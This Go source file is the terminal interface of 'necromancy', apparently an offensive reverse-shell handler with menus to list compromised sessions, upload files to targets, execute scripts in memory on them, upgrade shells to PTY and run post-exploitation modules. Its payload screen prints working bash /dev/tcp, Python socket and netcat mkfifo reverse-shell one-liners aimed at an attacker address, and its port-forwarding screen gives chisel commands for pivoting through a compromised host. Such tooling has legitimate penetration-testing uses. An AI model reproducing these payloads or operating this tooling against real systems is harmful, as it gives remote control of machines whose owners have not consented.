package ui

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"regexp"
	"strings"

	"github.com/Aryma-f4/necromancy/core"
	"github.com/Aryma-f4/necromancy/modules"
	"github.com/Aryma-f4/necromancy/pty"
	"github.com/gdamore/tcell/v2"
	"github.com/rivo/tview"
)

// getBannerFromFile reads and parses the ASCII banner from file
func getBannerFromFile() string {
	file, err := os.Open("ascii.txt")
	if err != nil {
		// Fallback to simple text banner if file not found
		return "[yellow]NECROMANCY[-]\n[blue]Advanced Shell Manager[-]"
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		// Parse BBCode color tags for tview
		line = parseBBCodeForTview(line)
		lines = append(lines, line)
	}

	if err := scanner.Err(); err != nil {
		return "[yellow]NECROMANCY[-]\n[blue]Advanced Shell Manager[-]"
	}

	return strings.Join(lines, "\n")
}

// parseBBCodeForTview converts BBCode color tags to tview format
func parseBBCodeForTview(text string) string {
	// Convert [color=#hex] to tview color format
	colorPattern := regexp.MustCompile(`\[color=([^\]]+)\]`)
	text = colorPattern.ReplaceAllString(text, "[$1]")

	// Convert [/color] to tview reset
	text = strings.ReplaceAll(text, "[/color]", "[-:-:-]")

	// Remove size and font tags
	text = regexp.MustCompile(`\[size=[^\]]+\]`).ReplaceAllString(text, "")
	text = regexp.MustCompile(`\[/size\]`).ReplaceAllString(text, "")
	text = regexp.MustCompile(`\[font=[^\]]+\]`).ReplaceAllString(text, "")
	text = regexp.MustCompile(`\[/font\]`).ReplaceAllString(text, "")

	// Remove HTML span tags
	text = regexp.MustCompile(`<span[^>]*>`).ReplaceAllString(text, "")
	text = regexp.MustCompile(`</span>`).ReplaceAllString(text, "")

	return text
}

type App struct {
	tviewApp *tview.Application
	pages    *tview.Pages
	sessions *core.SessionManager
	menuList *tview.List
}

func NewApp(sm *core.SessionManager) *App {
	return &App{
		tviewApp: tview.NewApplication(),
		pages:    tview.NewPages(),
		sessions: sm,
	}
}

func (a *App) Setup() {
	// Make the overall app background transparent (match terminal)
	tview.Styles.PrimitiveBackgroundColor = tcell.ColorDefault

	// Create main layout with ASCII art
	flex := tview.NewFlex().SetDirection(tview.FlexRow)

	// Create text view for ASCII art
	logoView := tview.NewTextView().
		SetDynamicColors(true).
		SetTextAlign(tview.AlignCenter)

	// Set the logo view background to transparent
	logoView.SetBackgroundColor(tcell.ColorDefault)

	// Use ASCII banner from file
	bannerText := getBannerFromFile()
	logoView.SetWrap(false)
	logoView.SetWordWrap(false)
	logoView.SetText(bannerText)

	a.menuList = tview.NewList().
		AddItem("View Sessions", "List all active reverse shells", 's', a.showSessionsList).
		AddItem("Show Payloads", "Show reverse shell payloads", 'p', a.showPayloads).
		AddItem("Show Modules", "List available post-exploitation modules", 'm', a.showAllModules).
		AddItem("Interfaces", "List local network interfaces", 'i', a.showInterfaces).
		AddItem("Exit", "Quit application", 'q', func() {
			a.tviewApp.Stop()
		})

	a.menuList.SetBorder(true).SetTitle(" Necromancy Main Menu v1.0 ")
	a.menuList.SetBackgroundColor(tcell.ColorDefault)

	// Add logo and menu to flex
	flex.AddItem(logoView, 0, 1, false).
		AddItem(a.menuList, 0, 1, true)

	a.pages.AddPage("menu", flex, true, true)
}

func (a *App) Run() error {
	return a.tviewApp.SetRoot(a.pages, true).EnableMouse(true).Run()
}

func (a *App) showSessionsList() {
	list := tview.NewList()
	list.SetBorder(true).SetTitle(" Active Sessions (Esc to go back) ")

	sess := a.sessions.GetAll()
	if len(sess) == 0 {
		list.AddItem("No active sessions.", "Wait for a reverse shell to connect...", 'n', nil)
	} else {
		for i, s := range sess {
			idx := i
			shortcut := rune('1' + idx)
			title := fmt.Sprintf("Session %d: %s [%s]", s.ID, s.RemoteAddr, s.Type)

			list.AddItem(title, "Connect to shell", shortcut, func() {
				a.showSessionActions(s.ID)
			})
		}
	}

	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		return event
	})

	a.pages.AddPage("sessions", list, true, true)
}

func (a *App) UpdateSessionsList() {
	a.tviewApp.QueueUpdateDraw(func() {
		a.showSessionsList()
	})
}

func (a *App) showSessionActions(id int) {
	_, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	list := tview.NewList().
		AddItem("Interact", "Connect to the shell", 'i', func() {
			a.openSessionTerminal(id)
		}).
		AddItem("Run Module", "Run a post-exploitation module", 'm', func() {
			a.showModulesList(id)
		}).
		AddItem("Upload File", "Upload a local file to target via base64", 'u', func() {
			a.showUploadForm(id)
		}).
		AddItem("In-Memory Exec", "Execute a local script on target in-memory", 'e', func() {
			a.showExecForm(id)
		}).
		AddItem("Port Forwarding", "Set up tunneling / proxying", 'p', func() {
			a.showPortFwd(id)
		}).
		AddItem("Kill", "Terminate the session", 'k', func() {
			a.sessions.Remove(id)
			a.showSessionsList()
		})

	list.SetBorder(true).SetTitle(fmt.Sprintf(" Actions for Session %d ", id))
	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.showSessionsList()
			return nil
		}
		return event
	})

	a.pages.AddPage("session_actions", list, true, true)
}

func (a *App) showUploadForm(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	form := tview.NewForm().
		AddInputField("Local File", "", 40, nil, nil).
		AddInputField("Remote Destination", "/tmp/uploaded", 40, nil, nil)

	form.AddButton("Upload", func() {
		local := form.GetFormItem(0).(*tview.InputField).GetText()
		remote := form.GetFormItem(1).(*tview.InputField).GetText()
		if local != "" && remote != "" {
			// Do upload
			err := modules.UploadFile(session, local, remote)
			if err != nil {
				log.Printf("Upload error: %v", err)
			}
		}
		a.showSessionActions(id)
	}).
		AddButton("Cancel", func() {
			a.showSessionActions(id)
		})

	form.SetBorder(true).SetTitle(fmt.Sprintf(" Upload to Session %d ", id))
	a.pages.AddPage("upload_form", form, true, true)
}

func (a *App) showExecForm(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	form := tview.NewForm().
		AddInputField("Local Script", "", 40, nil, nil)

	form.AddButton("Execute", func() {
		local := form.GetFormItem(0).(*tview.InputField).GetText()
		if local != "" {
			err := modules.ExecuteInMemory(session, local)
			if err != nil {
				log.Printf("Execute error: %v", err)
			}
		}
		a.showSessionActions(id)
	}).
		AddButton("Cancel", func() {
			a.showSessionActions(id)
		})

	form.SetBorder(true).SetTitle(fmt.Sprintf(" Execute In-Memory on Session %d ", id))
	a.pages.AddPage("exec_form", form, true, true)
}

func (a *App) showPortFwd(id int) {
	tv := tview.NewTextView().SetDynamicColors(true)
	tv.SetBorder(true).SetTitle(fmt.Sprintf(" Port Forwarding (Session %d) ", id))

	instructions := `[yellow]Port Forwarding / Pivoting[white]

To tunnel traffic through this shell, we recommend using Chisel.
Since Python is no longer used for the background agent, the native Go
method is to upload a statically compiled Chisel binary or run Ligolo.

1. Upload chisel to the target:
   (Go back, select 'Upload File', upload your local chisel binary)

2. Execute Chisel on the target to connect back to your server:
   ./chisel client YOUR_IP:8080 R:socks

3. Run Chisel server locally:
   chisel server -p 8080 --reverse

[green]Note: You can also use the 'Run Module' menu to automate Ligolo/Chisel setup.[white]
`
	tv.SetText(instructions)
	tv.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.showSessionActions(id)
			return nil
		}
		return event
	})
	a.pages.AddPage("portfwd", tv, true, true)
}

func (a *App) showModulesList(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	mm := modules.NewModuleManager()
	list := tview.NewList()

	for name, mod := range mm.Modules {
		modName := name
		list.AddItem(modName, mod.Description(), 0, func() {
			err := mm.RunModule(modName, session)
			if err != nil {
				log.Printf("Module error: %v", err)
			}
			a.showSessionActions(id)
		})
	}

	list.SetBorder(true).SetTitle(fmt.Sprintf(" Modules for Session %d ", id))
	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.showSessionActions(id)
			return nil
		}
		return event
	})

	a.pages.AddPage("modules_list", list, true, true)
}

func (a *App) openSessionTerminal(id int) {
	session, exists := a.sessions.Get(id)
	if !exists {
		return
	}

	// 1. Suspend the Tview Application to drop into raw terminal
	a.tviewApp.Suspend(func() {
		// 2. Clear terminal screen
		fmt.Print("\033[H\033[2J")

		// 3. Auto PTY upgrade if it's the first time connecting
		if session.Type != "PTY" {
			fmt.Printf("[*] Auto-upgrading Session %d to PTY...\n", session.ID)
			err := pty.AutoUpgrade(session)
			if err != nil {
				log.Printf("PTY upgrade failed: %v", err)
			}
		}

		// 4. Drop into raw mode interaction loop
		core.Interact(session)
	})

	// Return back to session list after Detach (F12)
	a.showSessionsList()
}

func (a *App) showInterfaces() {
	tv := tview.NewTextView().SetDynamicColors(true)
	tv.SetBorder(true).SetTitle(" Network Interfaces (Esc to go back) ")
	tv.SetText(core.GetInterfaces())
	tv.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		return event
	})
	a.pages.AddPage("interfaces", tv, true, true)
}
func (a *App) showPayloads() {
	tv := tview.NewTextView().SetDynamicColors(true)
	tv.SetBorder(true).SetTitle(" Reverse Shell Payloads (Esc to go back) ")

	payloads := `[green]Available Reverse Shell Payloads:[white]

[yellow]Bash:[white]
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1

[yellow]Python:[white]
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'

[yellow]Netcat:[white]
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4444 >/tmp/f
`
	tv.SetText(payloads)
	tv.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		return event
	})
	a.pages.AddPage("payloads", tv, true, true)
}

func (a *App) showAllModules() {
	mm := modules.NewModuleManager()
	list := tview.NewList()
	list.SetBorder(true).SetTitle(" Available Modules (Esc to go back) ")

	// Add all modules to the list
	for name, mod := range mm.Modules {
		modName := name
		modDesc := mod.Description()
		list.AddItem(modName, modDesc, 0, nil)
	}

	list.SetInputCapture(func(event *tcell.EventKey) *tcell.EventKey {
		if event.Key() == tcell.KeyEscape {
			a.pages.SwitchToPage("menu")
			return nil
		}
		return event
	})

	a.pages.AddPage("all_modules", list, true, true)
}
